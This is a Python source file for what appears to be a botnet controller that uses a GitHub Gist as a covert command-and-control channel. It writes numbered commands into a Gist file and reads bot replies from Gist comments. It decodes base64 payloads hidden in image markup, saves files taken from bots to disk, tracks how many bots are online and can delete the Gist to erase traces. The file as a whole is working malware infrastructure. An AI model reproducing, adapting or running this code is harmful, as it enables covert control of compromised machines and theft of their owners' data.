#!/usr/bin/python3
import os
import sys
import json
import time
from githubGist import GithubGist
from datetime import datetime
from consolecolors import FG
from variables import COMMANDS, BOT_IDLETIME
from imageEncoder import ImageEncoder

def print_error(message):
	print(FG.RED + message + FG.RESET)


class BotManager:
	def __init__(self, gist: GithubGist):
		self.gist = gist
		self.COMMAND_END = '\r\n'
		self.commands = COMMANDS
		self.bots = {'total': 0, 'online': 0}
		self.question = "What do you want to do?\n"
		self.help = "".join(["{} - {}\n".format(command_id, self.commands[command_id]["description"]) for command_id in self.commands.keys()])
		self.questions_file = self.gist.get_file(self.gist.questions_file)
		self.comments = self.gist.get_comments()
		self.command_id = self.get_command_id()

	def write_data_to_file(self, bot_id, question_id ,data):
		filename = "-".join([bot_id, question_id])
		f = open(filename, "a")
		f.write(data)
		f.close()
		return filename


	def parse_comment(self, comment):
		bot_id = comment[5:].partition(' ')[0]
		question_id = comment.partition('> Question ')[2].partition(': ')[0]
		question = comment.partition('> ')[2].partition('\r\n')[0]
		response = comment.partition('\r\n\n')[2]
		if response.startswith('![image]('):
			response = response[31:-1]
			response = ImageEncoder.decodeFromBase64(response)

		# check if response needs to be written to file
		if question.partition(': ')[2].startswith(self.commands['6']['question'].partition('{}')[0]):
			filename = self.write_data_to_file(bot_id=bot_id, question_id=question_id, data=response)
			return "File from bot {} saved into '{}'".format(bot_id ,filename)


		return 'bot {} responsed to "{}" with: \n{}'.format(bot_id, question, response)

	def print_new_responses(self):
		old_comments_count = len(self.comments)
		self.comments = new_comments = self.gist.get_comments()
		if old_comments_count >= len(new_comments):
			return

		new_comments = new_comments[old_comments_count:]
		print("-----------New responses-----------")
		for comment in new_comments:
			print(self.parse_comment(comment['body']))



	def start(self):
		self.run = True
		while (self.run):
			self.handleInput(input(self.question + self.help))

	def get_command_id(self) -> int:
		return self.questions_file['content'].count(self.COMMAND_END)


	def stop(self, clean: str):
		if clean.lower() == 'y':
			self.gist.delete()
		self.run = False

	def print_bots(self):
		online = f"{FG.GREEN if self.bots['online'] > 0 else FG.RESET} online {self.bots['online']} {FG.RESET}"
		print(f"You currently have total of {self.bots['total']} bots ({online})")

	def update_and_print_bots(self):
		self.get_number_of_bots()
		self.print_bots()

	def get_number_of_bots(self):
		activity_file = self.gist.get_file(self.gist.activity_file)
		activities = json.loads(activity_file['content'])
		self.bots = {'total': len(activities.keys()), 'online': 0}
		for activity in activities.values():
			last_seen = datetime.strptime(activity['last_seen'], "%Y-%m-%d %H:%M:%S.%f")

			delta = datetime.utcnow() - last_seen
			if delta.seconds < BOT_IDLETIME + BOT_IDLETIME/2:
				self.bots['online'] += 1
		return self.bots['online']

	def send_command(self, message, *args):
		message = message.format(*args)
		message = 'Question {}: {}{}'.format(self.command_id + 1, message, self.COMMAND_END)
		self.command_id += 1
		self.questions_file['content'] += message
		self.gist.update_file(self.gist.questions_file, self.questions_file['content'])


	def handleInput(self, input_text):
		if input_text in self.commands.keys():
			command = self.commands[input_text]
			args = []
			wait_for_response = False
			if 'question' in command.keys():
				wait_for_response = True
				args.append(command['question'])
			for arg_text in command['args']:
				args.append(input(arg_text))
			# try:
			getattr(self, command['func'])(*args)
			# except AttributeError:
			# 	print_error(f"Command function('{command['func']}') not implemented ")
			if wait_for_response:
				print('Wating for resposes... ')
				time.sleep(BOT_IDLETIME + 5)
				self.print_new_responses()
		else:
			print("Command not found")


def check_arguments():
	return len(sys.argv) >= 3 or (os.getenv('GITHUB_API_TOKEN') and os.getenv('GIST_NAME')) or (len(sys.argv) == 2 and (os.getenv('GITHUB_API_TOKEN') or os.getenv('GIST_NAME')))


def get_arguments():
	if len(sys.argv) >= 3:
		return sys.argv[1], sys.argv[2]
	if len(sys.argv) == 2:
		if os.getenv('GITHUB_API_TOKEN'):
			return os.getenv('GITHUB_API_TOKEN'), sys.argv[1]
		return sys.argv[1], os.getenv('GIST_NAME')
	return os.getenv('GITHUB_API_TOKEN'), os.getenv('GIST_NAME')


if __name__ == '__main__':
	if not check_arguments():
		print("Wrong arguments\nUsage: \n\tGITHUB_API_TOKEN GIST_NAME\n (both parameters can be replaced by environment variables using these names)")
		exit(1)

	github_token, gist_name = get_arguments()

	github_gist = GithubGist(github_token, gist_name, True)
	com = github_gist.get_comments()

	BotManager(github_gist).start()
	#BotManager(github_gist).print_new_responses()
